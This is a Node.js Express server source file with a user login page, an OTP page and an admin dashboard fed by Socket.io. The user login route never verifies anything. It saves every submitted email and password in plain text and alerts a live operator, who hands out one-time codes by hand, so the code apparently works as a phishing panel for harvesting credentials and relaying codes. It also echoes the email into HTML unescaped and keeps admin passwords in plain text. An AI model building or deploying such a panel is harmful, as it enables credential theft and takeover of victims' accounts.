require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const jwt = require('jsonwebtoken');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files with absolute paths - FIXED for Render
const publicPath = path.join(__dirname, 'public');
console.log('📁 Serving static files from:', publicPath);

// Check if public directory exists
if (!fs.existsSync(publicPath)) {
  console.error('❌ Public directory not found at:', publicPath);
  console.error('📝 Current directory:', __dirname);
  console.error('📝 Files in current directory:', fs.readdirSync(__dirname));
} else {
  console.log('✅ Public directory found');
  
  // List contents for debugging
  try {
    const files = fs.readdirSync(publicPath);
    console.log('📁 Public directory contents:', files);
    
    if (fs.existsSync(path.join(publicPath, 'users'))) {
      console.log('📁 Users directory contents:', fs.readdirSync(path.join(publicPath, 'users')));
    }
    if (fs.existsSync(path.join(publicPath, 'admin'))) {
      console.log('📁 Admin directory contents:', fs.readdirSync(path.join(publicPath, 'admin')));
    }
  } catch (e) {
    console.log('Could not list directories:', e.message);
  }
}

// Serve static files
app.use(express.static(publicPath));

// Explicit routes for HTML pages
app.get('/', (req, res) => {
  res.sendFile(path.join(publicPath, 'users/login.html'));
});

app.get('/users/login', (req, res) => {
  res.sendFile(path.join(publicPath, 'users/login.html'));
});

app.get('/users/login.html', (req, res) => {
  res.sendFile(path.join(publicPath, 'users/login.html'));
});

app.get('/users/otp', (req, res) => {
  res.sendFile(path.join(publicPath, 'users/otp.html'));
});

app.get('/users/otp.html', (req, res) => {
  res.sendFile(path.join(publicPath, 'users/otp.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(publicPath, 'admin/index.html'));
});

app.get('/admin/index', (req, res) => {
  res.sendFile(path.join(publicPath, 'admin/index.html'));
});

app.get('/admin/index.html', (req, res) => {
  res.sendFile(path.join(publicPath, 'admin/index.html'));
});

app.get('/admin/dashboard', (req, res) => {
  res.sendFile(path.join(publicPath, 'admin/dashboard.html'));
});

app.get('/admin/dashboard.html', (req, res) => {
  res.sendFile(path.join(publicPath, 'admin/dashboard.html'));
});

// Database configuration - Optimized for Neon
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  },
  connectionTimeoutMillis: 10000,
  idleTimeoutMillis: 30000,
  max: 20,
  keepAlive: true,
  keepAliveInitialDelayMillis: 10000
});

pool.on('error', (err) => {
  console.error('❌ Unexpected database pool error:', err.message);
});

// Test database connection immediately
pool.connect((err, client, release) => {
  if (err) {
    console.error('❌ Error connecting to database:', err.message);
    console.error('📝 DATABASE_URL is:', process.env.DATABASE_URL ? 'Set ✓' : 'Not set ✗');
  } else {
    console.log('✅ Successfully connected to Neon PostgreSQL database');
    release();
  }
});

// JWT middleware
const authenticateJWT = (req, res, next) => {
  const authHeader = req.headers.authorization;
  
  if (!authHeader) {
    return res.status(401).json({ error: 'No token provided' });
  }

  const token = authHeader.split(' ')[1];
  
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) {
      return res.status(403).json({ error: 'Invalid or expired token' });
    }
    req.user = user;
    next();
  });
};

// Socket.io authentication middleware
io.use((socket, next) => {
  const token = socket.handshake.auth.token;
  
  if (!token) {
    return next(new Error('Authentication error'));
  }

  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) {
      return next(new Error('Authentication error'));
    }
    socket.user = user;
    next();
  });
});

// Socket.io connection handling
io.on('connection', (socket) => {
  console.log('👤 Admin connected:', socket.id);
  
  socket.on('disconnect', () => {
    console.log('👤 Admin disconnected:', socket.id);
  });
});

// Database initialization
async function initializeDatabase() {
  try {
    console.log('📦 Initializing database tables...');
    
    // Create users table
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL,
        otp VARCHAR(6),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    console.log('✅ Users table created or already exists');

    // Create admin table
    await pool.query(`
      CREATE TABLE IF NOT EXISTS admin (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL
      )
    `);
    console.log('✅ Admin table created or already exists');

    // Check if default admin exists, if not create one
    const adminExists = await pool.query(
      'SELECT * FROM admin WHERE email = $1',
      [process.env.ADMIN_EMAIL]
    );

    if (adminExists.rows.length === 0) {
      await pool.query(
        'INSERT INTO admin (email, password) VALUES ($1, $2)',
        [process.env.ADMIN_EMAIL, process.env.ADMIN_PASSWORD]
      );
      console.log('✅ Default admin created');
    } else {
      console.log('✅ Default admin already exists');
    }

    console.log('✅ Database initialization completed successfully');
    return true;
  } catch (error) {
    console.error('❌ Database initialization error:', error.message);
    return false;
  }
}

// Generate 6-digit OTP
const generateOTP = () => {
  return crypto.randomInt(100000, 999999).toString();
};

// USER ENDPOINTS

// User login
app.post('/api/users/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    
    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required' });
    }

    // Save user to database
    await pool.query(
      'INSERT INTO users (email, password) VALUES ($1, $2) ON CONFLICT (email) DO UPDATE SET password = EXCLUDED.password',
      [email, password]
    );

    // Emit socket event for new login
    io.emit('new-login', { email, timestamp: new Date() });
    console.log('📢 New login event emitted for:', email);

    // Serve loading page
    res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Loading...</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          }
          .loading-container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
          }
          .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
          }
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
          .email {
            color: #667eea;
            font-weight: bold;
          }
        </style>
        <meta http-equiv="refresh" content="3;url=/users/otp?email=${encodeURIComponent(email)}">
      </head>
      <body>
        <div class="loading-container">
          <h2>Processing your request...</h2>
          <div class="spinner"></div>
          <p>Please wait, redirecting to OTP verification for <span class="email">${email}</span>...</p>
        </div>
      </body>
      </html>
    `);
  } catch (error) {
    console.error('❌ Login error:', error.message);
    res.status(500).json({ error: 'Server error: ' + error.message });
  }
});

// Verify OTP
app.post('/api/users/verify', async (req, res) => {
  try {
    const { email, otp } = req.body;
    
    if (!email || !otp) {
      return res.status(400).json({ error: 'Email and OTP are required' });
    }

    const result = await pool.query(
      'SELECT * FROM users WHERE email = $1 AND otp = $2',
      [email, otp]
    );

    if (result.rows.length === 0) {
      return res.status(400).json({ error: 'Invalid OTP' });
    }

    // Clear OTP after successful verification
    await pool.query(
      'UPDATE users SET otp = NULL WHERE email = $1',
      [email]
    );

    console.log('✅ OTP verified successfully for:', email);
    res.json({ success: true, message: 'OTP verified successfully' });
  } catch (error) {
    console.error('❌ Verify error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Resend OTP request
app.post('/api/users/resend', async (req, res) => {
  try {
    const { email } = req.body;
    
    if (!email) {
      return res.status(400).json({ error: 'Email is required' });
    }

    // Emit socket event for resend request
    io.emit('resend-request', { email, timestamp: new Date() });
    console.log('📢 Resend request event emitted for:', email);

    res.json({ success: true, message: 'Resend request sent to admin' });
  } catch (error) {
    console.error('❌ Resend error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ADMIN ENDPOINTS

// Admin login
app.post('/api/admin/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    
    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required' });
    }

    const result = await pool.query(
      'SELECT * FROM admin WHERE email = $1 AND password = $2',
      [email, password]
    );

    if (result.rows.length === 0) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    const token = jwt.sign(
      { id: result.rows[0].id, email: result.rows[0].email, role: 'admin' },
      process.env.JWT_SECRET,
      { expiresIn: '24h' }
    );

    console.log('✅ Admin logged in:', email);
    res.json({ token });
  } catch (error) {
    console.error('❌ Admin login error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get pending users (users with NULL otp)
app.get('/api/admin/pending', authenticateJWT, async (req, res) => {
  try {
    const result = await pool.query(
      'SELECT id, email, created_at FROM users WHERE otp IS NULL ORDER BY created_at DESC'
    );
    console.log(`📊 Found ${result.rows.length} pending users`);
    res.json(result.rows);
  } catch (error) {
    console.error('❌ Pending users error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Send OTP to user
app.post('/api/admin/send-otp', authenticateJWT, async (req, res) => {
  try {
    const { email, otp } = req.body;
    
    if (!email || !otp) {
      return res.status(400).json({ error: 'Email and OTP are required' });
    }

    if (!/^\d{6}$/.test(otp)) {
      return res.status(400).json({ error: 'OTP must be 6 digits' });
    }

    const result = await pool.query(
      'UPDATE users SET otp = $1 WHERE email = $2 RETURNING id',
      [otp, email]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'User not found' });
    }

    console.log('✅ OTP sent to:', email);
    res.json({ success: true, message: 'OTP sent successfully' });
  } catch (error) {
    console.error('❌ Send OTP error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    message: 'Server is running',
    database: process.env.DATABASE_URL ? 'Configured' : 'Not configured',
    timestamp: new Date().toISOString()
  });
});

// Test database connection endpoint
app.get('/api/test-db', async (req, res) => {
  try {
    const result = await pool.query('SELECT NOW() as time');
    res.json({ 
      success: true, 
      message: 'Database connection successful',
      time: result.rows[0].time 
    });
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('❌ Unhandled error:', err.stack);
  res.status(500).json({ error: 'Something went wrong!' });
});

// 404 handler for API routes
app.use('/api/*', (req, res) => {
  res.status(404).json({ error: 'API endpoint not found' });
});

// Initialize database and start server
const PORT = process.env.PORT || 3000;

initializeDatabase().then((success) => {
  if (success) {
    server.listen(PORT, '0.0.0.0', () => {
      console.log('\n🚀 Server started successfully!');
      console.log(`📡 Server running on port ${PORT}`);
      console.log(`🔗 User login: /users/login`);
      console.log(`🔗 Admin login: /admin`);
      console.log(`🔗 Health check: /api/health`);
      console.log(`🔗 Test database: /api/test-db`);
      console.log('\n📢 Socket.io server is ready for real-time notifications\n');
    });
  } else {
    console.log('\n❌ Server startup failed due to database connection issues');
    process.exit(1);
  }
});

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('\n📴 Shutting down server...');
  pool.end(() => {
    console.log('Database pool closed');
    process.exit(0);
  });
});

process.on('SIGTERM', () => {
  console.log('\n📴 Shutting down server...');
  pool.end(() => {
    console.log('Database pool closed');
    process.exit(0);
  });
});
